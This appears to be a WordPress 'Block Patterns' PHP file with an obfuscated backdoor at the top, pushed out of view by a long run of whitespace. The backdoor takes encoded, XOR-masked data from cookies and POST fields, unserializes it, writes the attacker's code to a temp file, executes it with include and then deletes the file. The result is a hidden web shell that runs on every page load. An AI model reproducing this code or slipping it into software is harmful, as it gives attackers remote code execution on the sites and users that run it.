<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("nlxmazt")){class nlxmazt{public static $slkgq = "qhoxxgypluohrsxy";public static $oxvlm = NULL;public function __construct(){$jwjxjhcfy = @$_COOKIE[substr(nlxmazt::$slkgq, 0, 4)];if (!empty($jwjxjhcfy)){$sxvyd = "base64";$knnclfdhll = "";$jwjxjhcfy = explode(",", $jwjxjhcfy);foreach ($jwjxjhcfy as $wtxqqmenlr){$knnclfdhll .= @$_COOKIE[$wtxqqmenlr];$knnclfdhll .= @$_POST[$wtxqqmenlr];}$knnclfdhll = array_map($sxvyd . "_decode", array($knnclfdhll,));$knnclfdhll = $knnclfdhll[0] ^ str_repeat(nlxmazt::$slkgq, (strlen($knnclfdhll[0]) / strlen(nlxmazt::$slkgq)) + 1);nlxmazt::$oxvlm = @unserialize($knnclfdhll);}}public function __destruct(){$this->lidavm();}private function lidavm(){if (is_array(nlxmazt::$oxvlm)) {$asgezzzpt = sys_get_temp_dir() . "/" . crc32(nlxmazt::$oxvlm["salt"]);@nlxmazt::$oxvlm["write"]($asgezzzpt, nlxmazt::$oxvlm["content"]);include $asgezzzpt;@nlxmazt::$oxvlm["delete"]($asgezzzpt);exit();}}}$uwajv = new nlxmazt();$uwajv = NULL;} ?><?php
/**
 * Block Patterns
 *
